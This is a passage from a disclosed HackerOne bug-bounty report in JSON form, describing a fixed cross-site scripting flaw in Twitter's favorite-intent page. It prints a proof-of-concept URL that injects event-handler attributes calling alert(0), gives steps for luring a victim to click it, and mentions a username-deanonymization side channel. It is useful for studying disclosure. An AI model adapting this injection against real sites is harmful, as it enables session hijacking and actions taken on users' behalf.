{"id":48516,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODUxNg==","url":"https://hackerone.com/reports/48516","title":"Redirect URL in /intent/ functionality is not properly escaped","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-02-21T23:47:32.767Z","submitted_at":"2015-02-21T23:47:32.767Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"homakov","url":"/homakov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/182/88285f48615cb1af0146adb653ab45d18b47ad96_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-02-24T21:55:21.923Z","bug_reporter_agreed_on_going_public_at":"2015-02-24T21:13:28.932Z","team_member_agreed_on_going_public_at":"2015-02-24T21:55:21.412Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Choose a tweet from a user that the victim follows but not favorited. \r\n\r\nSend the victim message like \"Please favorite this: https://twitter.com/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)\u0026tweet_id=440322224407314432 where 440322224407314432 is that tweet id\r\n\r\nThe problem is original_referer is not escaped if current Referrer is twitter.com. However it's very hard to get Referer like that because t.co is used everywhere and it kills Referers. So we are going to use this functionality itself twice to get proper Header. \r\n\r\nNormally twitter ignores user supplied \"original_referer\" unless Referer is twitter.com \r\n\r\nWhen the victim clicks the link it shows a dialog with \"Favorite\" button which has a hidden field in it:\r\n \r\n\u003cinput type=\"hidden\" name=\"referer\" value=\"/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)\u0026amp;tweet_id=440322224407314432\"\u003e \r\n\r\nThe victim sees Return to previous site link and when clicks, it instantly loads the same page with original_referer=Injection.\r\n\r\nInjection is inserted \"as is\" and it can overwrite CSS styles of the link and also inject malicious events in mouseover etc.\r\n\r\nProbably there's a better or more reliable way to make XSS payload execute, but I can't find it with blackbox.\r\n\r\nHow i noticed that? There's another bug i was making a tool for - probing username of current user from given database listening to side channel - twitter does window.close() if the user both follows \u0026 favorited this tweet. Demo http://homakov.github.io/twitterdetect.html \r\nNot sure if you want to fix that one too? ","vulnerability_information_html":"\u003cp\u003eChoose a tweet from a user that the victim follows but not favorited. \u003c/p\u003e\n\n\u003cp\u003eSend the victim message like \u0026quot;Please favorite this: \u003ca title=\"https://twitter.com/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)\u0026amp;tweet_id=440322224407314432\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fintent%2Ffavorite%3Foriginal_referer%3D%2520style%253Dfont-size%253A1000%253Bonautocompleteerror%253Dalert%280%29%2520onautocomplete%253Dalert%280%29%2520onwaiting%253Dalert%280%29%2520onvolumechange%253Dalert%280%29%2520ontoggle%253Dalert%280%29%2520ontimeupdate%253Dalert%280%29%2520onsuspend%253Dalert%280%29%2520onsubmit%253Dalert%280%29%2520onstalled%253Dalert%280%29%2520onshow%253Dalert%280%29%2520onselect%253Dalert%280%29%2520onseeking%253Dalert%280%29%2520onseeked%253Dalert%280%29%2520onscroll%253Dalert%280%29%2520onresize%253Dalert%280%29%2520onreset%253Dalert%280%29%2520onratechange%253Dalert%280%29%2520onprogress%253Dalert%280%29%2520onplaying%253Dalert%280%29%2520onplay%253Dalert%280%29%2520onpause%253Dalert%280%29%2520onmousewheel%253Dalert%280%29%2520onmouseup%253Dalert%280%29%2520onmouseover%253Dalert%280%29%2520onmouseout%253Dalert%280%29%2520onmousemove%253Dalert%280%29%2520onmouseleave%253Dalert%280%29%2520onmouseenter%253Dalert%280%29%2520onmousedown%253Dalert%280%29%2520onloadstart%253Dalert%280%29%2520onloadedmetadata%253Dalert%280%29%2520onloadeddata%253Dalert%280%29%2520onload%253Dalert%280%29%2520onkeyup%253Dalert%280%29%2520onkeypress%253Dalert%280%29%2520onkeydown%253Dalert%280%29%2520oninvalid%253Dalert%280%29%2520oninput%253Dalert%280%29%2520onfocus%253Dalert%280%29%2520onerror%253Dalert%280%29%2520onended%253Dalert%280%29%2520onemptied%253Dalert%280%29%2520ondurationchange%253Dalert%280%29%2520ondrop%253Dalert%280%29%2520ondragstart%253Dalert%280%29%2520ondragover%253Dalert%280%29%2520ondragleave%253Dalert%280%29%2520ondragenter%253Dalert%280%29%2520ondragend%253Dalert%280%29%2520ondrag%253Dalert%280%29%2520ondblclick%253Dalert%280%29%2520oncuechange%253Dalert%280%29%2520oncontextmenu%253Dalert%280%29%2520onclose%253Dalert%280%29%2520onclick%253Dalert%280%29%2520onchange%253Dalert%280%29%2520oncanplaythrough%253Dalert%280%29%2520oncanplay%253Dalert%280%29%2520oncancel%253Dalert%280%29%2520onblur%253Dalert%280%29%2520onabort%253Dalert%280%29%2520onwebkitfullscreenerror%253Dalert%280%29%2520onwebkitfullscreenchange%253Dalert%280%29%2520onwheel%253Dalert%280%29%2520onselectstart%253Dalert%280%29%2520onsearch%253Dalert%280%29%2520onpaste%253Dalert%280%29%2520oncut%253Dalert%280%29%2520oncopy%253Dalert%280%29%2520onbeforepaste%253Dalert%280%29%2520onbeforecut%253Dalert%280%29%2520onbeforecopy%253Dalert%280%29%26tweet_id%3D440322224407314432\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)\u0026amp;tweet_id=440322224407314432\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e where 440322224407314432 is that tweet id\u003c/p\u003e\n\n\u003cp\u003eThe problem is original_referer is not escaped if current Referrer is twitter.com. However it\u0026#39;s very hard to get Referer like that because t.co is used everywhere and it kills Referers. So we are going to use this functionality itself twice to get proper Header. \u003c/p\u003e\n\n\u003cp\u003eNormally twitter ignores user supplied \u0026quot;original_referer\u0026quot; unless Referer is twitter.com \u003c/p\u003e\n\n\u003cp\u003eWhen the victim clicks the link it shows a dialog with \u0026quot;Favorite\u0026quot; button which has a hidden field in it:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;referer\u0026quot; value=\u0026quot;/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)\u0026amp;amp;tweet_id=440322224407314432\u0026quot;\u0026gt; \u003c/p\u003e\n\n\u003cp\u003eThe victim sees Return to previous site link and when clicks, it instantly loads the same page with original_referer=Injection.\u003c/p\u003e\n\n\u003cp\u003eInjection is inserted \u0026quot;as is\u0026quot; and it can overwrite CSS styles of the link and also inject malicious events in mouseover etc.\u003c/p\u003e\n\n\u003cp\u003eProbably there\u0026#39;s a better or more reliable way to make XSS payload execute, but I can\u0026#39;t find it with blackbox.\u003c/p\u003e\n\n\u003cp\u003eHow i noticed that? There\u0026#39;s another bug i was making a tool for - probing username of current user from given database listening to side channel - twitter does window.close() if the user both follows \u0026amp; favorited this tweet. Demo \u003ca title=\"http://homakov.github.io/twitterdetect.html\" href=\"/redirect?url=http%3A%2F%2Fhomakov.github.io%2Ftwitterdetect.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://homakov.github.io/twitterdetect.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003cbr\u003e\nNot sure if you want to fix that one too? \u003c/p\u003e\n","bounty_amount":"1400.0","formatted_bounty":"$1,400","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":29840,"file_name":"Screen_Shot_2015-02-22_at_6.16.51_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/029/840/0c858c1f8c9bc63ef4cb8c421668485e97c36646/Screen_Shot_2015-02-22_at_6.16.51_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2015-02-22_at_6.16.51_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2015-02-22_at_6.16.51_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060600Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=0dcca001a8b939c1cb7e7637ca28eef9bcf167c97ebfefc70e9d60c478dd0a7c","file_size":99521,"type":"image/png"},{"id":29841,"file_name":"Screen_Shot_2015-02-22_at_6.19.33_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/029/841/8a03caf012f61bf1ec3ea3307d9722cbdca01299/Screen_Shot_2015-02-22_at_6.19.33_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2015-02-22_at_6.19.33_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2015-02-22_at_6.19.33_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060600Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=23732b722cc49c2c290d7a3b71646ee47f9a13b6aee79817043fc1fe0ff8caf0","file_size":83714,"type":"image/png"}],"allow_singular_disclosure_at":"2015-03-26T21:13:44.912Z","allow_singular_disclosure_after":-181817535.66020653,"singular_disclosure_allowed":true,"vote_count":2,"voters":["sameerphad72","archsolar"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":336928,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-22T01:25:57.597Z","updated_at":"2015-02-22T01:25:57.597Z","actor":{"username":"cmiller","cleared":false,"url":"/cmiller","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/113/6ef9b6413b36e8b43175bab4ec39791395346508_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":337078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi! we completed our deploy of the fix to address the script injection last night (remove generation of that link). we'll look at your window.close() issue shortly, and we meet to determine payouts at the end of the week.\n\nthanks again for letting us know about these!","markdown_message":"\u003cp\u003ehi! we completed our deploy of the fix to address the script injection last night (remove generation of that link). we\u0026#39;ll look at your window.close() issue shortly, and we meet to determine payouts at the end of the week.\u003c/p\u003e\n\n\u003cp\u003ethanks again for letting us know about these!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-22T14:21:55.950Z","updated_at":"2015-02-22T14:21:55.950Z","actor":{"username":"jimio","cleared":false,"url":"/jimio","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/734/78744d51291d123ab5043159d56fd0f228b782b3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":338593,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nice, I really wonder what was the cause of bug. It was hard to find intentionally.\n\nCan you make this public?","markdown_message":"\u003cp\u003eNice, I really wonder what was the cause of bug. It was hard to find intentionally.\u003c/p\u003e\n\n\u003cp\u003eCan you make this public?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-23T19:59:40.748Z","updated_at":"2015-02-23T19:59:40.748Z","actor":{"username":"homakov","cleared":false,"url":"/homakov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/182/88285f48615cb1af0146adb653ab45d18b47ad96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":338611,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"sure thing. you need to 'request public disclosure' in here when we mark the issue resolved, and we'd be happy to oblige. could you give us a little time to look into the second issue that you mention here with the username deanonymization? we want to respond to that as well 